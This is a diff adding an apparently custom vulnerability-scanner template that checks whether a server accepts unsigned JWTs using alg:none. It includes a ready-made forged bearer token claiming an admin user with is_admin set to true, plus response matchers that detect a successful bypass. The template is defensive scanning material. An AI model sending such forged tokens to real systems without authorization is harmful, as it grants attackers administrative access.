@@ -1,0 +1,41 @@
+id: jwt-algorithm-none-bypass
+
+info:
+  name: JWT Algorithm None Bypass
+  author: custom
+  severity: critical
+  description: |
+    The server accepts JWT tokens with alg:none, allowing signature
+    bypass. An attacker can forge arbitrary tokens without the secret.
+  reference:
+    - https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/
+  tags: jwt,auth-bypass,token
+
+http:
+  - raw:
+      - |
+        GET {{Path}} HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOnRydWUsImlhdCI6OTk5OTk5OTk5OX0.
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "admin"
+          - "authenticated"
+          - "success"
+          - "dashboard"
+        condition: or
+
+      - type: word
+        negative: true
+        words:
+          - "invalid"
+          - "expired"
+          - "unauthorized"
+          - "denied"
